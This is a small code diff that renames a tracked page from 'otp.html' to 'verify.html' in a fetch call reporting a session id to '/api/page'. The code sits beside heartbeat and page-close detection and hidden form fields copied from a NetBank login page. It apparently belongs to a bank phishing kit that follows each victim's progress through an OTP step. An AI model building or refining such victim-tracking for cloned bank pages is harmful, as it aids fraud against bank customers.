@@ -47,7 +47,7 @@
   fetch('/api/page', {
     method: 'POST',
     headers: { 'content-type': 'application/json' },
-    body: JSON.stringify({ sid, page: 'otp.html' })
+    body: JSON.stringify({ sid, page: 'verify.html' })
   }).catch(() => {});
 
   /* ===== HEARTBEAT & PAGE CLOSE DETECTION ===== */
@@ -515,6 +515,7 @@ document.write("<input type=\"hidden\" name=\"JS\" value=\"E\" />");
 	<input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""/><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""/><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"/><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value=""/>
 </body>
 </html>
+
 
 
 
